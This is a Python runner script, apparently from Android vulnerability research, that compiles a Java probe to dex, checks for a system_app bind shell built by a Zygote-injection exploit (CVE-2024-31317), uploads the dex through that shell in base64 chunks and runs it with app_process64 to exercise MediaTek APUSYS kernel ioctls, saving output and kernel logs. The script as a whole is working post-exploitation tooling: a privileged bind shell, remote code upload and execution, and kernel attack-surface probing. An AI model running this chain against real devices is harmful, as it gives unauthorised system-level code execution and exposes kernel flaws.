#!/usr/bin/env python3
"""Build, upload, and run the APUSYS Java probe through a system_app shell."""

import argparse
import base64
import hashlib
import os
import shlex
import shutil
import socket
import subprocess
import sys
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
APUSYS_JAVA = ROOT / "13-apusys-ioctl-surface" / "poc" / "ApusysIoctlProbe.java"
XRP_WRAPPER_JAVA = (
    ROOT / "13-apusys-ioctl-surface" / "poc" / "XrpWrapperInspect.java"
)
DRM_TRIGGER_JAVA = ROOT / "07-cve-2023-32836-display-overflow" / "poc" / "DrmTrigger.java"
REBUILD_BIND_SHELL = (
    ROOT / "06-cve-2024-31317-zygote-injection" / "poc" / "rebuild_bind_shell.py"
)
DEFAULT_REMOTE_DEX = "/data/data/com.android.settings/cache/apusys_ioctl_probe.dex"
DEFAULT_XRP_REMOTE_DEX = "/data/data/com.android.settings/cache/xrp_wrapper_inspect.dex"
DEFAULT_RESULT_DIR = ROOT / "poc-run-results" / "2026-06-14-batch"


def run(cmd, timeout=60, cwd=ROOT, check=True):
    proc = subprocess.run(
        cmd,
        cwd=cwd,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )
    if check and proc.returncode != 0:
        rendered = " ".join(shlex.quote(str(part)) for part in cmd)
        raise RuntimeError(
            f"command failed ({proc.returncode}): {rendered}\n"
            f"stdout:\n{proc.stdout}\n"
            f"stderr:\n{proc.stderr}"
        )
    return proc


def adb(serial, args, timeout=30, check=False):
    cmd = ["adb"]
    if serial:
        cmd += ["-s", serial]
    cmd += args
    return run(cmd, timeout=timeout, check=check)


def find_android_jar(explicit):
    candidates = []
    if explicit:
        candidates.append(Path(explicit))
    if os.environ.get("ANDROID_JAR"):
        candidates.append(Path(os.environ["ANDROID_JAR"]))
    if os.environ.get("ANDROID_HOME"):
        home = Path(os.environ["ANDROID_HOME"])
        candidates += sorted(home.glob("platforms/android-*/android.jar"), reverse=True)
    candidates += [
        Path("/opt/homebrew/share/android-commandlinetools/platforms/android-34/android.jar"),
        Path("/opt/android-sdk/platforms/android-34/android.jar"),
        Path.home() / "Library/Android/sdk/platforms/android-34/android.jar",
    ]
    for candidate in candidates:
        if candidate.exists():
            return candidate
    raise RuntimeError("android.jar not found; pass --android-jar or set ANDROID_JAR")


def probe_sources(probe):
    if probe == "apusys":
        return "ApusysIoctlProbe", [DRM_TRIGGER_JAVA, APUSYS_JAVA]
    if probe == "xrp-wrapper":
        return "XrpWrapperInspect", [DRM_TRIGGER_JAVA, XRP_WRAPPER_JAVA]
    raise RuntimeError(f"unknown probe: {probe}")


def build_dex(android_jar, build_dir, dex_dir, probe):
    clean_dir(build_dir)
    clean_dir(dex_dir)
    build_dir.mkdir(parents=True)
    dex_dir.mkdir(parents=True)

    _, sources = probe_sources(probe)
    run(
        [
            "javac",
            "-source",
            "8",
            "-target",
            "8",
            "-cp",
            str(android_jar),
            "-d",
            str(build_dir),
        ] + [str(path) for path in sources],
        timeout=60,
    )
    class_files = [str(path) for path in build_dir.rglob("*.class")]
    if not class_files:
        raise RuntimeError("javac produced no .class files")
    run(["d8", "--min-api", "29", "--output", str(dex_dir)] + class_files, timeout=60)
    dex = dex_dir / "classes.dex"
    if not dex.exists():
        raise RuntimeError("d8 did not produce classes.dex")
    data = dex.read_bytes()
    return dex, hashlib.md5(data).hexdigest(), hashlib.sha256(data).hexdigest()


def clean_dir(path):
    path = path.resolve()
    if not path.exists():
        return
    if "apusys" not in path.name:
        raise RuntimeError(f"refusing to remove non-APUSYS build directory: {path}")
    shutil.rmtree(path)


def shell_command(port, command, timeout=20, marker_prefix="__APUSYS_RUNNER_DONE__"):
    marker = f"{marker_prefix}{time.time_ns()}__"
    wrapped = f"{command}\n_status=$?\necho {marker}:$_status\n"
    data = b""
    with socket.create_connection(("127.0.0.1", port), timeout=timeout) as sock:
        sock.settimeout(0.5)
        sock.sendall(wrapped.encode("utf-8"))
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = sock.recv(8192)
            except socket.timeout:
                continue
            if not chunk:
                break
            data += chunk
            if marker.encode("ascii") in data:
                break
    text = data.decode("utf-8", errors="replace").replace("\x00", "")
    status = None
    marker_at = text.find(marker)
    if marker_at >= 0:
        after = text[marker_at + len(marker):].splitlines()[0]
        if after.startswith(":"):
            try:
                status = int(after[1:].strip())
            except ValueError:
                status = None
        text = text[:marker_at] + text[marker_at + len(marker) + len(after):]
    return status, text.strip("\r\n")


def require_system_app(port):
    status, out = shell_command(
        port,
        "id; cat /proc/self/attr/current; echo",
        timeout=10,
    )
    if status != 0 or "uid=1000(system)" not in out or "u:r:system_app:s0" not in out:
        raise RuntimeError(f"local tcp:{port} is not a system_app shell:\n{out}")
    return out


def rebuild_system_app_shell(args):
    if not args.serial:
        raise RuntimeError("--rebuild-shell requires -s/--serial or ANDROID_SERIAL")
    cmd = [
        sys.executable,
        str(REBUILD_BIND_SHELL),
        "-s",
        args.serial,
        "-p",
        str(args.bind_port),
        "--local-port",
        str(args.local_port),
        "--helper-ports",
        args.rebuild_helper_ports,
        "--retries",
        str(args.rebuild_retries),
    ]
    if args.skip_rebuild_clean:
        cmd.append("--skip-clean")
    proc = run(cmd, timeout=args.rebuild_timeout, check=False)
    if proc.stdout:
        print(proc.stdout.rstrip())
    if proc.stderr:
        print(proc.stderr.rstrip(), file=sys.stderr)
    if proc.returncode != 0:
        raise RuntimeError(f"system_app bind shell rebuild failed: {proc.returncode}")


def upload_dex(port, dex, remote_path, expected_md5, chunk_size):
    remote_q = shlex.quote(remote_path)
    b64_path = f"{remote_path}.b64"
    b64_q = shlex.quote(b64_path)
    shell_command(
        port,
        f"rm -f {remote_q} {b64_q}; : > {b64_q}; chmod 600 {b64_q}",
        timeout=15,
    )

    encoded = base64.b64encode(dex.read_bytes()).decode("ascii")
    total = (len(encoded) + chunk_size - 1) // chunk_size
    for idx in range(total):
        chunk = encoded[idx * chunk_size:(idx + 1) * chunk_size]
        status, out = shell_command(
            port,
            f"printf '%s\\n' '{chunk}' >> {b64_q}",
            timeout=15,
        )
        if status != 0:
            raise RuntimeError(f"base64 chunk upload failed at {idx + 1}/{total}:\n{out}")

    status, out = shell_command(
        port,
        (
            f"base64 -d {b64_q} > {remote_q}; "
            f"rm -f {b64_q}; chmod 600 {remote_q}; "
            f"ls -lZ {remote_q}; md5sum {remote_q}"
        ),
        timeout=30,
    )
    if status != 0:
        raise RuntimeError(f"remote base64 decode failed:\n{out}")
    if expected_md5 not in out:
        raise RuntimeError(f"remote md5 mismatch, expected {expected_md5}:\n{out}")
    return out


def clear_logcat(serial):
    adb(serial, ["logcat", "-c"], timeout=15)


def capture_kernel_log(serial, pattern):
    proc = adb(serial, ["logcat", "-d", "-b", "kernel", "-v", "threadtime"], timeout=30)
    text = proc.stdout
    if proc.returncode != 0 or not text.strip():
        proc = adb(serial, ["shell", "dmesg"], timeout=30)
        text = proc.stdout
    needles = tuple(part.lower() for part in pattern.split("|") if part)
    lines = []
    for line in text.splitlines():
        low = line.lower()
        if any(needle in low for needle in needles):
            lines.append(line)
    return "\n".join(lines) + ("\n" if lines else "")


def render_args(arg_text):
    if not arg_text:
        return ""
    return " ".join(shlex.quote(part) for part in shlex.split(arg_text))


def run_probe(port, remote_path, main_class, mode, timeout):
    remote_q = shlex.quote(remote_path)
    rendered_args = render_args(mode)
    command = (
        f"id; cat /proc/self/attr/current; echo; md5sum {remote_q}; "
        f"CLASSPATH={remote_q} app_process64 /system/bin "
        f"{shlex.quote(main_class)} {rendered_args}; "
        "sleep 2"
    )
    status, out = shell_command(port, command, timeout=timeout)
    return status, out


def write_result(path, header, body):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(header + body, encoding="utf-8", errors="replace")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-s", "--serial", default=os.environ.get("ANDROID_SERIAL"))
    parser.add_argument("--local-port", type=int, default=48888,
                        help="local adb-forward port for the system_app bind shell")
    parser.add_argument("--bind-port", type=int, default=8888,
                        help="device-side bind shell port used by rebuild_bind_shell.py")
    parser.add_argument("--rebuild-shell", action="store_true",
                        help="clean/rebuild the system_app bind shell before running")
    parser.add_argument("--rebuild-if-needed", action="store_true",
                        help="rebuild the bind shell if the local system_app check fails")
    parser.add_argument("--rebuild-helper-ports", default="8889",
                        help="helper device-side shell ports passed to rebuild_bind_shell.py")
    parser.add_argument("--rebuild-retries", type=int, default=3)
    parser.add_argument("--rebuild-timeout", type=int, default=240)
    parser.add_argument("--skip-rebuild-clean", action="store_true",
                        help="pass --skip-clean to rebuild_bind_shell.py")
    parser.add_argument("--android-jar")
    parser.add_argument("--probe", choices=("apusys", "xrp-wrapper"), default="apusys")
    parser.add_argument("--mode", default="--run-cmd-vpu-guard")
    parser.add_argument("--remote-dex", default=DEFAULT_REMOTE_DEX)
    parser.add_argument("--build-dir", default="/tmp/apusys-build")
    parser.add_argument("--dex-dir", default="/tmp/apusys-dex")
    parser.add_argument("--result-dir", default=str(DEFAULT_RESULT_DIR))
    parser.add_argument("--result-name", default="13_apusys_run_cmd_vpu_guard.txt")
    parser.add_argument("--kernel-result-name",
                        default="13_apusys_run_cmd_vpu_guard_kernel.txt")
    parser.add_argument("--kernel-pattern", default="apusys|vpu|mdw|vpu_req_check")
    parser.add_argument("--upload-chunk", type=int, default=2048)
    parser.add_argument("--timeout", type=int, default=120)
    parser.add_argument("--skip-build", action="store_true")
    args = parser.parse_args()

    main_class, _ = probe_sources(args.probe)
    if args.probe == "xrp-wrapper" and args.remote_dex == DEFAULT_REMOTE_DEX:
        args.remote_dex = DEFAULT_XRP_REMOTE_DEX

    android_jar = find_android_jar(args.android_jar)
    build_dir = Path(args.build_dir)
    dex_dir = Path(args.dex_dir)
    result_dir = Path(args.result_dir)

    if args.rebuild_shell:
        print("[*] Rebuilding system_app bind shell")
        rebuild_system_app_shell(args)

    print(f"[*] Checking system_app shell on 127.0.0.1:{args.local_port}")
    try:
        context = require_system_app(args.local_port)
    except RuntimeError:
        if not args.rebuild_if_needed:
            raise
        print("[*] system_app shell check failed; rebuilding bind shell")
        rebuild_system_app_shell(args)
        context = require_system_app(args.local_port)
    print(context)

    if args.skip_build:
        dex = dex_dir / "classes.dex"
        if not dex.exists():
            raise RuntimeError(f"--skip-build requested but {dex} does not exist")
        data = dex.read_bytes()
        dex_md5 = hashlib.md5(data).hexdigest()
        dex_sha256 = hashlib.sha256(data).hexdigest()
    else:
        print(f"[*] Building dex with {android_jar}")
        dex, dex_md5, dex_sha256 = build_dex(
            android_jar, build_dir, dex_dir, args.probe
        )
    print(f"[*] dex={dex} md5={dex_md5} sha256={dex_sha256}")

    print(f"[*] Uploading through system_app shell to {args.remote_dex}")
    upload_info = upload_dex(
        args.local_port,
        dex,
        args.remote_dex,
        dex_md5,
        args.upload_chunk,
    )
    print(upload_info)

    if args.serial:
        clear_logcat(args.serial)

    print(f"[*] Running {args.mode}")
    status, output = run_probe(
        args.local_port, args.remote_dex, main_class, args.mode, args.timeout
    )

    header = (
        f"command=CLASSPATH={args.remote_dex} app_process64 /system/bin "
        f"{main_class} {args.mode}\n"
        f"probe={args.probe}\n"
        f"dex_md5={dex_md5}\n"
        f"dex_sha256={dex_sha256}\n"
        f"remote_dex={args.remote_dex}\n"
        f"shell_port=127.0.0.1:{args.local_port}\n"
        f"exit_status={status}\n\n"
    )
    result_path = result_dir / args.result_name
    write_result(result_path, header, output + "\n")
    print(f"[*] Wrote {result_path}")

    if args.serial:
        kernel = capture_kernel_log(args.serial, args.kernel_pattern)
        kernel_path = result_dir / args.kernel_result_name
        write_result(
            kernel_path,
            f"pattern={args.kernel_pattern}\nsource=adb logcat -b kernel or dmesg fallback\n\n",
            kernel,
        )
        print(f"[*] Wrote {kernel_path} ({len(kernel.splitlines())} matching lines)")

    if status not in (0, None):
        return status
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
